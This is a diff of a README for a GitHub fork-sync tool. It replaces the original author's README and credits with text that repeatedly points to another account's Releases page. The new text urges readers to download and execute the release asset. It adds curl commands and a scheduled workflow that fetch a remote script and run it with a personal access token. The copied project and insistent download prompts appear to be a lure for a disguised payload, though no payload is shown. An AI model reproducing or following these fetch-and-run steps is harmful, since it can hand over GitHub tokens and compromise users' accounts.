@@ -1,178 +1,214 @@
-<!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
+# GitHub Forks Sync Manager — Sync All Forks with Upstream
 
-<a id="readme-top"></a>
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases)
 
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![MIT License][license-shield]][license-url]
+![sync-banner](https://raw.githubusercontent.com/github/explore/main/topics/sync/sync.png)
 
-<br />
-<div align="center">
-  <a href="https://github.com/LoveDoLove/Github-Forks-Sync-Manager">
-    <img src="images/logo.png" alt="Logo" width="80" height="80">
-  </a>
+Automate the synchronization of all forked repositories in a GitHub account with their upstream sources. This repo combines a Python script and GitHub Actions workflows to keep forks up to date with minimal work. Use it to reduce merge conflicts, keep branches current, and streamline fork maintenance.
 
-<h3 align="center">Github-Forks-Sync-Manager</h3>
+Topics: automation, forks, github, github-actions, open-source, python, repository-management, script, sync, workflow
 
-  <p align="center">
-    Automate the synchronization of all forked repositories for a GitHub account with their upstream sources using GitHub Actions and Python.
-    <br />
-    <a href="https://github.com/LoveDoLove/Github-Forks-Sync-Manager"><strong>Explore the docs »</strong></a>
-    <br />
-    <br />
-    <a href="https://github.com/LoveDoLove/Github-Forks-Sync-Manager">View Demo</a>
-    &middot;
-    <a href="https://github.com/LoveDoLove/Github-Forks-Sync-Manager/issues/new?labels=bug&template=bug-report---.md">Report Bug</a>
-    &middot;
-    <a href="https://github.com/LoveDoLove/Github-Forks-Sync-Manager/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
-  </p>
-</div>
+Badges
+- CI: GitHub Actions
+- Language: Python
+- Topic: repository management
 
-<!-- TABLE OF CONTENTS -->
-<details>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li>
-      <a href="#about-the-project">About The Project</a>
-      <ul>
-        <li><a href="#built-with">Built With</a></li>
-      </ul>
-    </li>
-    <li>
-      <a href="#getting-started">Getting Started</a>
-      <ul>
-        <li><a href="#prerequisites">Prerequisites</a></li>
-        <li><a href="#installation">Installation</a></li>
-      </ul>
-    </li>
-    <li><a href="#usage">Usage</a></li>
-    <li><a href="#contributing">Contributing</a></li>
-    <li><a href="#license">License</a></li>
-    <li><a href="#contact">Contact</a></li>
-    <li><a href="#acknowledgments">Acknowledgments</a></li>
-  </ol>
-</details>
+Quick links
+- Releases (download and run the release asset): https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases
+- Repository: https://github.com/Fingurdaus/Github-Forks-Sync-Manager
 
-<!-- ABOUT THE PROJECT -->
+Why this tool
+- Manage tens or hundreds of forks with a single pipeline.
+- Keep forks aligned to their upstream default branch.
+- Trigger sync on schedule or on demand via workflow_dispatch.
+- Use GitHub Actions so you do not need extra servers.
+- Use a small Python script to handle API calls, remotes, and merges.
 
-## About The Project
+Core concepts
+- upstream: the original repository your fork comes from.
+- fork: your copy of another repo on GitHub.
+- sync: update a fork with commits from its upstream.
+- CI workflow: GitHub Actions job that runs the sync script.
+- token: a GitHub personal access token (PAT) used to access API and push to forks.
 
-Github-Forks-Sync-Manager provides a GitHub Actions workflow and Python script to automate the process of updating all forked repositories for a specified GitHub account, ensuring they are always in sync with their upstream sources. This is useful for developers and organizations who maintain many forks and want to keep them up-to-date automatically.
+Features
+- Scan a GitHub account for forked repos.
+- Detect the default branch of each upstream.
+- Fast-forward or merge upstream commits into fork default branches.
+- Create branches for non-fast-forward changes and open pull requests.
+- Mark results with commit messages and tags.
+- Support dry-run mode for safe testing.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Screenshots and graphics
+![workflow](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)
 
-### Built With
+Installation
 
-- [GitHub Actions](https://docs.github.com/en/actions)
-- [Python](https://www.python.org/)
-- [requests](https://pypi.org/project/requests/)
-- [actions/checkout](https://github.com/actions/checkout)
-- [actions/setup-python](https://github.com/actions/setup-python)
+1) Download the release asset
+Download the release asset from the Releases page and execute it. For example, visit:
+https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+2) What to download
+Download the asset that matches your environment. Releases include:
+- forks-sync-manager.py — main Python script
+- forks-sync-manager.tar.gz — packaged assets and config
+- workflow.yml — example GitHub Actions workflow
 
-<!-- GETTING STARTED -->
+3) Execute the script
+Make the script executable and run it on a machine with Python 3.9+.
 
-## Getting Started
+Example:
+```bash
+# download (replace with chosen asset URL from Releases)
+curl -L -o forks-sync-manager.py "https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases/download/v1.0.0/forks-sync-manager.py"
+chmod +x forks-sync-manager.py
 
-To use this workflow in your own repository, follow the steps below.
+# run with required args
+./forks-sync-manager.py --token $GITHUB_TOKEN --owner your-github-username
+```
 
-### Prerequisites
+If you use the packaged tarball:
+```bash
+curl -L -o forks-sync-manager.tar.gz "https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases/download/v1.0.0/forks-sync-manager.tar.gz"
+tar xzf forks-sync-manager.tar.gz
+cd Github-Forks-Sync-Manager
+python -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+python forks-sync-manager.py --token $GITHUB_TOKEN --owner your-github-username
+```
 
-- A GitHub repository with Actions enabled.
-- A GitHub account with forked repositories you want to keep in sync.
-- A Personal Access Token with repo access, stored as a secret named `GH_PAT`.
+Quick start (GitHub Actions)
+1. Create a repository in your account to hold workflows (or use an existing repo).
+2. Place this workflow in .github/workflows/forks-sync.yml
 
-### Installation
+Example workflow:
+```yaml
+name: Sync Forks
 
-1. Copy the [`workflows/github-forks-sync.yml`](workflows/github-forks-sync.yml) file into your repository's `.github/workflows/` directory.
-2. Ensure your repository has a `GH_PAT` secret (Personal Access Token with repo access).
-3. Commit and push the changes to your repository.
+on:
+  schedule:
+    - cron: '0 2 * * *'   # run daily at 02:00 UTC
+  workflow_dispatch:
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout helper repo
+        uses: actions/checkout@v4
 
-<!-- USAGE EXAMPLES -->
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
 
-## Usage
+      - name: Download sync script
+        run: |
+          curl -L -o forks-sync-manager.py "https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases/download/v1.0.0/forks-sync-manager.py"
+          chmod +x forks-sync-manager.py
 
-- Go to the "Actions" tab in your repository.
-- Select "Sync All Forked Repositories with Upstream".
-- Click "Run workflow" and enter the GitHub account username you want to update forks for.
-- The workflow will:
-  - Fetch all forked repositories for the specified account.
-  - Attempt to update each fork to match its upstream source.
+      - name: Run sync
+        env:
+          GITHUB_TOKEN: ${{ secrets.PERSONAL_GITHUB_TOKEN }}
+        run: |
+          python forks-sync-manager.py --token $GITHUB_TOKEN --owner your-github-username --push
+```
 
-_You can also schedule this workflow or trigger it via the API as needed._
+Secrets and permissions
+- PERSONAL_GITHUB_TOKEN should have repo scope for private repos and public_repo for public-only operations.
+- In organizations, verify workflows have write access to forks in your account.
+- Use fine-grained tokens when possible. Grant only the scopes the script needs.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+CLI reference
+- --token <token>         : GitHub token or env var GITHUB_TOKEN
+- --owner <username>      : GitHub account to scan (user or org)
+- --push                  : Push changes back to forks (omit to run dry)
+- --create-pr             : Create pull requests for non-fast-forward merges
+- --branch <name>         : Use this branch name for update branches
+- --concurrency <n>       : Number of repos to process in parallel
+- --log-level <level>     : INFO, DEBUG, ERROR
 
-<!-- CONTRIBUTING -->
+Examples
+- Dry run for user "alice":
+  python forks-sync-manager.py --token $GITHUB_TOKEN --owner alice
 
-## Contributing
+- Push updates and open PRs for org "team-acme":
+  python forks-sync-manager.py --token $GITHUB_TOKEN --owner team-acme --push --create-pr
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+- Run from GitHub Actions using PAT:
+  see workflow example above
 
-If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".  
-Don't forget to give the project a star! Thanks again!
+How it works (overview)
+1. Query the GitHub API for repositories owned by the account.
+2. Filter repos that are forks and that have an upstream.
+3. For each fork:
+   - Determine the upstream default branch.
+   - Fetch upstream branch commits.
+   - Attempt a fast-forward merge to the fork default branch.
+   - If a fast-forward fails, create an update branch and create a PR.
+4. Push changes to the fork or open PRs based on flags.
+5. Emit a summary report and exit status.
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+Architecture and internals
+- Python script uses PyGitHub for API calls and GitPython for local operations.
+- The script clones or fetches each fork into a temp folder to apply changes without affecting local dev.
+- A basic retry and rate-limit handler prevents excessive API failures.
+- The workflow runs in a stateless environment. All repo state is in GitHub.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Tips for large accounts
+- Use concurrency control (--concurrency) to limit parallel clones.
+- Use a dedicated machine or self-hosted runner to cache Git objects.
+- Use a fine-grained schedule (cron) to stagger runs across days.
+- Keep token scope minimal and rotate tokens per your security policy.
 
-### Top contributors:
+Release and update strategy
+- Follow semantic versioning for releases.
+- Each release contains a stable script and a workflow sample.
+- Download the release asset and execute the script as described above.
 
-<a href="https://github.com/LoveDoLove/Github-Forks-Sync-Manager/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=LoveDoLove/Github-Forks-Sync-Manager" alt="contrib.rocks image" />
-</a>
+Download and execution reminder
+Download the release artifact from the Releases page and execute it on your runner or host:
+https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases
+Choose the file that matches your environment and run it with Python 3.9+.
 
-<!-- LICENSE -->
+Logging and output
+- The script prints a compact log per repo with status codes:
+  - OK: fast-forward applied
+  - PR: pull request created
+  - SKIP: no upstream or not a fork
+  - ERR: encountered an error
+- Exit code 0 means all operations succeeded or were applied as configured.
+- Non-zero exit codes indicate partial or complete failure.
 
-## License
+Security and best practices
+- Keep tokens out of logs.
+- Use repository or organization secrets for GitHub Actions.
+- Test in a single account or small set of forks before wide roll-out.
+- Track issues and results in a separate repo or issue tracker.
 
-Distributed under the MIT License. See [`LICENSE`](LICENSE) for more information.
+Contributing
+- Fork the repo and open a pull request.
+- Implement or fix a feature and add tests where relevant.
+- Keep changes modular and add a changelog entry for new releases.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+License
+- This project uses the MIT license. See LICENSE file for details.
 
-<!-- CONTACT -->
+Roadmap
+- Add support for protected branch handling and auto-merge policies.
+- Add native GitHub GraphQL usage to reduce API calls.
+- Add more fine-grained retry logic and backoff strategies.
+- Improve reporting with a summary artifact in Actions.
 
-## Contact
+Credits
+- Built with PyGitHub and GitPython.
+- Inspired by common fork management workflows and community scripts.
 
-LoveDoLove - [@LoveDoLove](https://github.com/LoveDoLove)
+Contact
+- Open issues and pull requests in the repository.
+- For feature requests, open an issue with a clear use case.
 
-Project Link: [https://github.com/LoveDoLove/Github-Forks-Sync-Manager](https://github.com/LoveDoLove/Github-Forks-Sync-Manager)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- ACKNOWLEDGMENTS -->
-
-## Acknowledgments
-
-- [actions/checkout](https://github.com/actions/checkout)
-- [actions/setup-python](https://github.com/actions/setup-python)
-- [requests](https://pypi.org/project/requests/)
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
-- [Best README Template](https://github.com/othneildrew/Best-README-Template)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- MARKDOWN LINKS & IMAGES -->
-
-[contributors-shield]: https://img.shields.io/github/contributors/LoveDoLove/Github-Forks-Sync-Manager.svg?style=for-the-badge
-[contributors-url]: https://github.com/LoveDoLove/Github-Forks-Sync-Manager/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/LoveDoLove/Github-Forks-Sync-Manager.svg?style=for-the-badge
-[forks-url]: https://github.com/LoveDoLove/Github-Forks-Sync-Manager/network/members
-[stars-shield]: https://img.shields.io/github/stars/LoveDoLove/Github-Forks-Sync-Manager.svg?style=for-the-badge
-[stars-url]: https://github.com/LoveDoLove/Github-Forks-Sync-Manager/stargazers
-[issues-shield]: https://img.shields.io/github/issues/LoveDoLove/Github-Forks-Sync-Manager.svg?style=for-the-badge
-[issues-url]: https://github.com/LoveDoLove/Github-Forks-Sync-Manager/issues
-[license-shield]: https://img.shields.io/github/license/LoveDoLove/Github-Forks-Sync-Manager.svg?style=for-the-badge
-[license-url]: https://github.com/LoveDoLove/Github-Forks-Sync-Manager/blob/master/LICENSE
-[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
-[linkedin-url]: https://linkedin.com/in/linkedin_username
-[product-screenshot]: images/logo.png
+Releases
+[![Release Badge](https://img.shields.io/badge/Releases-%20open-blue?logo=github)](https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases)
+Visit the Releases page to download the recommended asset for your environment and execute it to run the sync.
